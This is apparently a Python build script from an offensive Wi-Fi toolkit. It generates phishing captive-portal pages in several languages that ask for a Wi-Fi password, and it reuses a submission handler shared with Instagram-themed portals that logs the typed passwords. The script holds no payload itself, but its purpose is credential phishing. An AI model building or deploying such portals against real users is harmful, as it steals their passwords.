#!/usr/bin/env python3
"""Build the generic Wi-Fi password captive portals.

Usage:
    scripts/build_wifi_portals.py            # write the portals
    scripts/build_wifi_portals.py --check    # exit 1 if they are stale

Adding a language means one entry in ``scripts/wifi_portal/languages.json``;
adding or changing the markup means editing the templates and re-running this
script. The submission endpoint is shared with the Instagram portals: both
record the typed password under the same workspace log the GUI already tails.
"""

from __future__ import annotations

import argparse

from portal_builder import REPO_DIR, run_family

SOURCE_DIR = REPO_DIR / "scripts" / "wifi_portal"
SITES_DIR = REPO_DIR / "attacks" / "Captive Portal" / "sites"

TEMPLATES = ("index.html", "error.html", "final.html")
STATIC_FILES = {
    "submit.php": REPO_DIR / "scripts" / "instagram_portal" / "submit.php",
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--check",
        action="store_true",
        help="do not write anything; fail if the committed portals differ",
    )
    args = parser.parse_args()

    return run_family(
        label="WiFi",
        source_dir=SOURCE_DIR,
        sites_dir=SITES_DIR,
        prefix="WiFi",
        templates=TEMPLATES,
        static_files=STATIC_FILES,
        check=args.check,
    )


if __name__ == "__main__":
    raise SystemExit(main())
